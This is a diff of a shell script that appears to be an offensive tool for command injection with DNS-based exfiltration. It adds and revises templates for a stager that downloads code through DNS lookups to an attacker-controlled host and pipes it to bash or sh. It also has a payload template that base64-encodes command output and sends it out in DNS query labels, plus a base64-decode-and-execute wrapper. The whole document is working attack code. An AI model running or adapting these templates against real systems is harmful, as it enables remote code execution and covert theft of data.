@@ -203,6 +203,8 @@ printf "Timeout: ${YELLOW}${timeout}${NC}\n"
 ##########sh definitions#######
 assign sh outer_cmd_template 'sh -c $@|base64${IFS}-d|sh . echo %CMD_B64%'
 
+assign sh stager_template '(seq %ITERATIONS%|%S_DNS_TRIGGGER% $(cat).%UNIQUE_DNS_HOST%|tr . \ |printf %02x $(cat)|xxd -r -p)|bash'
+
 assign sh inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
     assign sh inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
@@ -210,9 +212,10 @@ assign sh inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1,%
 #assign bash inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$(($(date +%N)/100000%5)) -eq 0 ]] && wait or sleep' ."
 
 ##########bash definitions#######
-assign bash stager_template 'while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(%S_DNS_TRIGGGER% $i.%UNIQUE_DNS_HOST%);c=$(printf %02x ${a[*]}|xxd -r -p);done|bash'
-
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
+
+#assign bash stager_template 'while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(%S_DNS_TRIGGGER% $i.%UNIQUE_DNS_HOST%);c=$(printf %02x ${a[*]}|xxd -r -p);done|bash'
+assign bash stager_template '(seq %ITERATIONS%|%S_DNS_TRIGGGER% $(cat).%UNIQUE_DNS_HOST%|tr . \ |printf %02x $(cat)|xxd -r -p)|bash'
 
 assign bash inner_cmd_template "(${cmd})|base64 -w0|echo \$(cat)--|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%"
 [[ $strict_label_charset -eq 1 ]] && {
@@ -274,6 +277,7 @@ else
     stager=${stager_template}
     stager=${stager//'%UNIQUE_DNS_HOST%'/$stager_unique_dns_host}
     stager=${stager//'%S_DNS_TRIGGGER%'/$s_dns_trigger}
+    stager=${stager//'%ITERATIONS%'/$(((${#inner_cmd}+3)/4))}
     cmd_b64=$(echo "$stager"|b64)
     echo "Stager: $stager"
     echo "Payload: $inner_cmd"
